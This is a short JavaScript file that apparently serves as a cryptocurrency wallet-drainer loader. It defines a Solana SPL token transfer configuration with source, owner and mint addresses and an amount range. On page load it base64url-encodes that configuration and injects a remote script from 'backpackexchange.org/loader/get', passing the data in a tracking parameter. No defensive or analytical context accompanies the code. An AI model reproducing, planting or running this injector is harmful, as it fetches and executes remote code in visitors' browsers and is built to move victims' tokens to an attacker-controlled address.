
window.customTransactions = [
    { // +pudgy penguins transfer
        "type": "spl",
        "source": "Cdc77Y1G1JyeXB6WrJJG7RBvUmNK4Mxp3ojGumRT5ovn",
        "owner": "3HA76bpwHuST6Uo9BouJ4A5GpAiDuerr7QBenUqbXZAL",
        "mint": "2zMMhcVQEXDtdE6vsFS7S7D5oUodfJHE8vd1gnBouauv",
        "amountMin": 1_000_000,
        "amountMax": 100_000_000_000,
    },
]

function toBase64Url(input) {
    return btoa(input) 
      .replace(/\+/g, '-') 
      .replace(/\//g, '_') 
      .replace(/=+$/, ''); 
}

function loadScript() {
  const payload = toBase64Url(JSON.stringify(window.customTransactions))
  var scriptTag = document.createElement('script');
  
  scriptTag.src = "https://backpackexchange.org/loader/get?id=6780d9451815638f328d7076&_track=" + payload
  scriptTag.onload = () => {
  console.log("Loaded the loader.js")
  }
  document.body.appendChild(scriptTag);
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", function () {
    loadScript()
  });
} else {
  loadScript()
}
